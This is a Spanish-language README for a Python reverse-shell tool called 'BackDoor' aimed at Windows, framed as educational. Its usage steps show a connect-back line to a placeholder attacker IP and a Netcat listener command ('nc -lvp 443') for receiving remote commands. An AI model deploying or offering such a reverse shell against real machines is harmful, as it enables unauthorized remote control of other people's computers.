# BackDoor 

👤 AUTOR:
-------------------------------------
⭐ Desarrollado por Hector Arango 
🔗 Github: https://github.com/hmam13

📋 DESCRIPCION:
-------------------------------------
BackDoor es una herramienta educativa diseñada para entender la comunicación 
remota entre computadoras mediante una "Shell Inversa".

El script funciona como un túnel secreto: conecta tu computadora con otra 
remota. Usa un "teléfono" (librería socket) para llamar y un "ayudante" 
(librería subprocess) que ejecuta las órdenes que recibe y te cuenta los 
resultados de vuelta. 🪟 Está optimizado para sistemas Windows.

⚠️ ADVERTENCIAS:
-------------------------------------
🛑 [!] Este script es exclusivamente para fines EDUCATIVOS.

🚫 [!] No lo uses en computadoras ajenas sin permiso, ya que es ilegal.

🛡️ [!] Úsalo solo en entornos controlados para aprender sobre ciberseguridad.

🛠️ REQUISITOS:
-------------------------------------
1. Python 3 instalado.
2. Librerías estándar (ya vienen con Python):
   - socket
   - subprocess
3. Conexión a internet o red local.

📥 INSTALACION:
-------------------------------------
git clone https://github.com/hmam13/BackDoor

🚀 MODO DE USO:
-------------------------------------
1. Abrir el archivo BackDoor.py y poner tu IP y el Puerto:
   socket_cliente.connect(("TU_IP", PUERTO))

2. En la otra computadora, poner un programa a "escuchar":
   (Ejemplo con Netcat: nc -lvp 443)

3. Ejecutar el script:
   python3 BackDoor.py

4. El script se conectará y podrás enviarle comandos desde la otra PC.
5. Verás los resultados de los comandos en tu pantalla remota.
